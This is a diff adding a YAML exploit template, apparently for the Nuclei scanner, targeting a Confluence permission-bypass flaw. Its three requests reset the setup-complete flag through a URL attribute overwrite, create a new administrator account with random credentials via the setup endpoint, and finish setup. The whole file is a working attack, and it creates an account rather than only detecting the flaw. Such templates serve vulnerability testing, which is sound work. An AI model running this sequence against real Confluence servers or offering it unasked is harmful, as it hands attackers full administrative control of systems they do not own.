@@ -1,0 +1,65 @@
+id: poc-yaml-confluence-attribute-overwrite-permission-bypass
+info:
+  name: Confluence Attribute Overwrite Permission Bypass
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: privilege-escalation
+  description: |
+    A vulnerability in Confluence allows an attacker to bypass permissions by overwriting attributes during setup.
+
+variables:
+  username: "{{rand_text_alpha(6)}}"
+  password: "{{rand_text_alphanumeric(6)}}"
+
+http:
+  - id: "check-setup-complete"
+    method: GET
+    path:
+      - "{{BaseURL}}/server-info.action?bootstrapStatusProvider.applicationConfig.setupComplete=false"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: header
+        words:
+          - "confluence-base-url"
+      - type: word
+        part: body
+        words:
+          - "<title> - Confluence</title>"
+
+  - id: "setup-administrator"
+    method: POST
+    path:
+      - "{{BaseURL}}/setup/setupadministrator.action"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+      X-Atlassian-Token: no-check
+    body: |
+      username={{username}}&fullName={{username}}&email=admin@{{username}}.com&password={{password}}&confirm={{password}}&setup-next-button=Next
+    matchers:
+      - type: status
+        status:
+          - 302
+
+  - id: "finish-setup"
+    method: GET
+    path:
+      - "{{BaseURL}}/setup/finishsetup.action"
+    headers:
+      X-Atlassian-Token: no-check
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "<title>Setup Successful - Confluence</title>"
+      - type: word
+        part: header
+        words:
+          - "X-Confluence-Request-Time"
